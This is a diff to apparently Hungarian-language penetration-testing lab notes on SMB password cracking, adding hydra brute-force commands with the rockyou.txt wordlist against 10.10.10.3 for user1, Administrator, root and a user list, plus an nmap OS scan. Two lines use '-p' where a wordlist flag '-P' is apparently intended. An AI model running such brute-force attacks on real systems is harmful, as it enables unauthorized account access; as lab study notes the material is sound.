@@ -11,9 +11,14 @@
 
 ## Password cracking
 * Keressunk usert hozza, anelkul nem sok ertelme van elkezdeni.
+  * hydra -l user1 -P ./rockyou.txt smb://10.10.10.3
 * Ha megis user nelkul akarjuk csinalni akkor celszeru admin userrel tolni (amirol ugye tudjuk hogy mindig ott van)
   * Windows SMB -> 'Administrator'
+    * hydra -l Administrator -p ./rockyou.txt smb://10.10.10.3
   * Linux SMB (Samba) -> 'root'
+    * hydra -l root -p ./rockyou.txt smb://10.10.10.3
+* Ha jo tippunk van a usernevre, vagy tudunk 10-20at ami nagyon igeretes, (vagy ismerjuk az osszes usernevet valahonnan), akkor toljuk user es password listaval
+  * hydra -L user_list.txt -P ./rockyou.txt smb://10.10.10.3
 ## OS specific enum and attacks
 * sudo nmap -Pn 10.10.10.3 -sT -O
 ### Linux SMB (Samba)
